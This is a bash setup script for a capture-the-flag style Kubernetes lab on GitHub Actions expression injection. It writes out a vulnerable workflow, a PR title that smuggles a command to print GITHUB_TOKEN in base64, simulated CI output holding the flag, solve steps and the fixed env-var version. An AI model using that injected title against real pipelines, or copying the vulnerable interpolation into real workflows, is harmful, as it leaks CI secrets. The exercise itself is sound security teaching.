#!/usr/bin/env bash
set -euo pipefail

NAMESPACE="dojo-sec-ci"

echo "==> Setting up: CI Injection"

kubectl create namespace "$NAMESPACE" --dry-run=client -o yaml | kubectl apply -f -

# Simulated CI output from an expression injection attack
# The "GITHUB_TOKEN" value is the base64-encoded flag
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: ci-output
  namespace: dojo-sec-ci
  annotations:
    dojo.challenge/description: "Simulated GitHub Actions CI output from an expression injection attack"
data:
  workflow: |
    name: PR Validation
    on: pull_request

    jobs:
      validate:
        runs-on: ubuntu-latest
        steps:
        - name: Print PR info
          run: |
            echo "PR by: ${{ github.event.pull_request.user.login }}"
            echo "PR title: ${{ github.event.pull_request.title }}"
            echo "Branch: ${{ github.head_ref }}"

  pr_title: |
    "; printf '%s' $GITHUB_TOKEN | base64; echo "DONE

  output: |
    Run echo "PR by: attacker-user"
    PR by: attacker-user
    Run echo "PR title: "; printf '%s' $GITHUB_TOKEN | base64; echo "DONE"
    PR title:
    S1VCRXtnaXRodWJfYWN0aW9uc19pbmplY3Rpb25fdmlhX3ByX3RpdGxlfQ==
    DONE
    Run echo "Branch: attacker/pwn-the-ci"
    Branch: attacker/pwn-the-ci

  readme: |
    The PR title contained shell injection.
    The workflow's 'run:' step interpolated ${{ github.event.pull_request.title }} directly.
    The injected command printed a base64-encoded string to the CI log.
    That string is the simulated GITHUB_TOKEN — which contains the flag.

    To solve:
    1. Find the base64 blob in .data.output
    2. Decode it: echo "S1VCR..." | base64 -d
    3. Extract the KUBE{...} flag

  fix: |
    The vulnerable workflow:
      run: echo "PR title: ${{ github.event.pull_request.title }}"

    The fixed workflow:
      env:
        PR_TITLE: ${{ github.event.pull_request.title }}
      run: echo "PR title: $PR_TITLE"

    By moving the expression into an env: var, the value becomes data
    rather than code — shell injection is impossible.
EOF

echo ""
echo "==> Setup complete."
echo ""
echo "    ConfigMap: kubectl get configmap ci-output -n $NAMESPACE -o jsonpath='{.data.output}'"
echo "    Find the base64 blob and decode it to get the flag."
